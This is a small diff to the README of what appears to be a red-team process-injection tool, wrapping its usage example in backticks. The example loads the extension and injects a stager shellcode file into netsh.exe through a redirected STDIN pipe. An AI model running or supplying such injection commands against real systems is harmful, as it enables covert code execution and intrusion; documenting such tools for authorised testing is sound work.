@@ -9,8 +9,8 @@ Shellcode is delivered through the target's redirected **STDIN pipe**, located i
 
 ## Usage
 
-extensions load /path/to/InjectSetConsole-BOF
-injectconsole -path 'C:\Windows\System32\netsh.exe' -shellcode /tmp/stager.bin
+`extensions load /path/to/InjectSetConsole-BOF
+injectconsole -path 'C:\Windows\System32\netsh.exe' -shellcode /tmp/stager.bin`
 
 | Argument | Type | Description |
 |---|---|---|
